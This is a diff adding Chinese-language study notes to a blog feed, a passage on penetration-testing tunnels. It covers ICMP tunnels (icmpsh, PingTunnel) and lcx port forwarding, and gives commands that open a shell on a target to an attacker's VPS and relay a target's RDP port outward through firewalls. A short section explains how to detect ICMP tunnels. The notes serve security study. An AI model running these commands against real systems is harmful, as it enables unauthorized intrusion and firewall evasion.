@@ -5653,6 +5653,64 @@
 <p>什么是隧道？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</p>
 <p>常见的隧道包括：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络层：</span><br><span class="line">IPV6隧道、ICMP隧道、GRE隧道</span><br><span class="line"></span><br><span class="line">传输层：</span><br><span class="line">TCP隧道、UDP隧道、常规端口转发</span><br><span class="line"></span><br><span class="line">应用层：</span><br><span class="line">SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</span><br></pre></td></tr></table></figure>
+<h4 id="判断内网的连通性"><a href="#判断内网的连通性" class="headerlink" title="判断内网的连通性"></a>判断内网的连通性</h4><p>判断内网的联通性是指判断机器是否能够上外网。常见允许流量流出的端口有80、8080、443、53、110、123等。</p>
+<p>判断连通性的方法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ICMP协议：ping IP或域名</span><br><span class="line"></span><br><span class="line">TCP协议：nc -zv 【IP地址  端口号】</span><br><span class="line"></span><br><span class="line">HTTP协议：curl 【IP地址：端口号】</span><br><span class="line"></span><br><span class="line">DNS协议：nslookup 【域名 vps-ip】 &#x2F;dig@【vps-ip 域名】</span><br></pre></td></tr></table></figure>
+<h2 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h2><h3 id="IPV6隧道"><a href="#IPV6隧道" class="headerlink" title="IPV6隧道"></a>IPV6隧道</h3><p>IPV6隧道技术是指通过IPV4隧道传送IPV6报文的技术。</p>
+<p>IPV6隧道的工作过程如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">节点A要向节点B发送IPV6报文，首先需要在A和B之间建立一条隧道；</span><br><span class="line"></span><br><span class="line">节点A将IPV6报文封装在以节点 B的IPV4地址为目的地址、以自己的IPV4地址为源地址的IPV4报文中；</span><br><span class="line"></span><br><span class="line">在IPV4报文传输中，这个报文和普通IPV4报文一样，经过IPV4的转发到达节点B；</span><br><span class="line"></span><br><span class="line">节点B收到此报文之后，解除IPV4封装，取出其中的IPV6报文。</span><br></pre></td></tr></table></figure>
+<p>有一点需要注意：即使设备支持IPV6，也可能无法分析封装了IPV6的IPV4数据包。</p>
+<p>配置隧道和自动隧道的区别：</p>
+<p>只有在执行隧道功能的节点的IPV6地址是IPV4兼容地址时，自动隧道才是可行的。</p>
+<p>配置隧道的方法则是要求隧道末端节点使用其他机制来获得其IPV4地址，例如DHCP、人工配置或其他IPV4的配置方法。</p>
+<p>支持IPV6的隧道工具有：socat、6tunnel、nt6tunnel</p>
+<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>ICMP隧道简单、实用，是一个比较特殊的协议。ICMP协议不需要开放端口，最常见的ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。</p>
+<p>使用各类上层协议隧道失效时，可以通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙。</p>
+<p>常用的ICMP隧道工具：icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p>
+<h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><p>使用简单，跨平台，不需要管理员权限。</p>
+<p>1、使用git clone命令下载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git</span><br></pre></td></tr></table></figure>
+<p>2、安装python-impacket库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-impacket</span><br></pre></td></tr></table></figure>
+<p>3、关闭本地系统的ICMP应答，否则shell运行会不稳定，一直刷屏</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  &#x2F;&#x2F;恢复系统应答，则设置为0</span><br></pre></td></tr></table></figure>
+<p>4、运行./run.sh</p>
+<p>会提示输入目的的IP地址(目标主机的公网IP地址)，输入IP，并回车，会自动给出需要在目标主机上运行的命令并开始监听。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t 【ip】 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
+<p>在目标主机上运行以上命令后，即可在VPS上看到目标主机的shell。</p>
+<h4 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a>PingTunnel</h4><p>也是一款常用的ICMP隧道，可以跨平台使用，可以为隧道设置密码。</p>
+<p>1、在需要建立隧道的两台机器上安装PingTunnel工具</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zxvf xxxx.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+<p>安装过程中提示缺少pcap.h，则需要安装libpcap</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zxvf xxxxx.tar.gz</span><br><span class="line">cd libpcap</span><br><span class="line">.&#x2F;configure</span><br></pre></td></tr></table></figure>
+<p>出现yacc包错误提示，需要安装byacc包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y byacc</span><br></pre></td></tr></table></figure>
+<p>安装byacc包后，依次输入以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<p>2、使用方法</p>
+<p>在跳板机器上运行pingtunnel隧道</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptunnel -x shuteer</span><br></pre></td></tr></table></figure>
+<p>在VPS上执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptunnel -p 【跳板机IP】 -lp 1080 -da 【目标机器IP】 -dp 3389 -x shuteer</span><br><span class="line"></span><br><span class="line">-x：指定ICMP隧道连接密码</span><br><span class="line">-lp：指定要监听的本地TCP端口</span><br><span class="line">-da：指定要转发机器的IP地址</span><br><span class="line">-dp：指定要转发的目标机器的TCP端口</span><br><span class="line">-p：指定ICMP隧道另一端的机器IP地址</span><br></pre></td></tr></table></figure>
+<p>上述命令含义是：在访问攻击VPS的1080端口时，会把目标IP的3389端口的数据封装在ICMP隧道里，以跳板机为ICMP隧道跳板进行传送。</p>
+<p>输入w命令，可以查看已经登陆系统的用户列表。</p>
+<p>PingTunnel工具也可以在Windows环境中使用，需要在安装在wincap类库。</p>
+<h4 id="防御ICMP隧道攻击的方法"><a href="#防御ICMP隧道攻击的方法" class="headerlink" title="防御ICMP隧道攻击的方法"></a>防御ICMP隧道攻击的方法</h4><p>使用ICMP隧道时会产生大量的ICMP数据包，具体分析方法为：</p>
+<p>1、检测同一来源的ICMP数据包的数量。</p>
+<p>一个正常的ping命令每秒最多发送两个数据包，使用ICMP隧道的浏览器会在很短时间内产生上千个ICMP数据包。</p>
+<p>2、注意那些Payload大于64bit的ICMP数据包。</p>
+<p>3、寻找响应数据包的Payload与请求数据包中的Payload不一致的ICMP数据包。</p>
+<p>4、检查ICMP数据包的协议标签。如icmptunnel会在所有的ICMP Payload前面添加“TUNL” 标记来标识隧道–即特征。</p>
+<h2 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h2><p>传输层包括TCP隧道、UDP隧道和常规端口转发等。</p>
+<h3 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h3><p>经典端口转发工具lcx。lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版本为lcx.exe，Linux版本为portmap。</p>
+<h4 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h4><p>将目标机器3389端口所有数据转发到公网VPS的4444端口，在目标机器执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 【公网主机IP地址】 4444 【目标主机IP】 3389</span><br></pre></td></tr></table></figure>
+<p>将本机4444端口上监听的所有数据转发到本机的5555端口上，在VPS上执行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 4444 5555</span><br></pre></td></tr></table></figure>
+<p>用mstsc登录【公网主机IP：5555】，即可访问目标服务器的3389端口。</p>
+<h4 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h4><p>如果目标服务器由于防火墙的限制，部分端口的数据无法通过防火墙，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口。</p>
+<p>在目标主机上执行如下命令，即可从远程桌面连接目标机器的53端口。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -tran 53 【目标主机IP】 3389</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>读书笔记</category>
